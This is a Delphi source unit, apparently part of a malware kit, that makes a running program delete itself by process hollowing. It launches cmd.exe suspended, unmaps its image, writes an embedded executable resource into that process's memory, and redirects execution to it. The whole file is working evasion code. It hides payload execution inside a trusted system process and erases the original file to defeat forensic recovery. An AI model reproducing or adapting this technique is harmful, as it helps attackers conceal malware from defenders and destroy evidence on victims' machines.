unit SelfDeleteUnit;

interface

uses Windows, sysutils, rxtypes;

var
  nb: Cardinal;

function ZwUnmapViewOfSection(SectionHandle: THandle; p: Pointer): DWord; stdcall; external 'ntdll.dll';

var
  pi: TProcessInformation;
  si: TStartupInfo;
  x, p, q: Pointer;
  nt: PIMAGE_NT_HEADERS;
  context: TContext;
  sect: PIMAGE_SECTION_HEADER;

Procedure SelfDel;

implementation

{$R DeleteFileRes.res}

  function protect(characteristics: ULONG): ULONG;
  const  mapping: array [0..7] of ULONG =
    ( PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ,
      PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
  PAGE_EXECUTE_READWRITE);
  begin
    Result := mapping[characteristics shr 29];
  end;

procedure UnFormatDir(var s:string);
begin
 if s='' then exit;
 if s[length(s)]='\' then Delete(s,length(s),1);
end;

Procedure SelfDel;
var
  i : integer;
  Buf: PChar;
  WinDir : String;

begin
 GetMem(Buf, MAX_PATH);
 GetWindowsDirectory(Buf, MAX_PATH);
 WinDir:=Buf;
 UnFormatDir(WinDir);
 si.cb := SizeOf(si);
 CreateProcess(PChar(WinDir+'\System32\cmd.exe'),PChar(' DeleteFile "'+ParamStr(0)+'"'), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, si, pi);
 context.ContextFlags := CONTEXT_INTEGER;
 GetThreadContext(pi.hThread,  context);
 ReadProcessMemory(pi.hProcess, PCHAR(context.ebx) + 8, @x, sizeof (x), nb );
 ZwUnmapViewOfSection(pi.hProcess, x);
 p := LockResource(LoadResource(Hinstance, FindResource(Hinstance, 'DELETEFILEEXE', RT_RCDATA)));
 if p = nil then exit;
 nt := PIMAGE_NT_HEADERS(PCHAR(p) + PIMAGE_DOS_HEADER(p).e_lfanew);
 q := VirtualAllocEx( pi.hProcess,
                       Pointer(nt.OptionalHeader.ImageBase),
                       nt.OptionalHeader.SizeOfImage,
                       MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 WriteProcessMemory(pi.hProcess, q, p, nt.OptionalHeader.SizeOfHeaders, nb);
 sect := PIMAGE_SECTION_HEADER(nt);
 Inc(PIMAGE_NT_HEADERS(sect));
 for I := 0 to nt.FileHeader.NumberOfSections - 1 do
 begin
       WriteProcessMemory(pi.hProcess,
                           PCHAR(q) + sect.VirtualAddress,
                           PCHAR(p) + sect.PointerToRawData,
                           sect.SizeOfRawData, nb);
       VirtualProtectEx( pi.hProcess,
                          PCHAR(q) + sect.VirtualAddress,
                          sect.SizeOfRawData,
                          protect(sect.Characteristics),
                          @x);
  Inc(sect);
 end;
 WriteProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, @q, sizeof(q), nb);
 context.Eax := ULONG(q) + nt.OptionalHeader.AddressOfEntryPoint;
 SetThreadContext(pi.hThread, context);
 ResumeThread(pi.hThread);
end;

end.
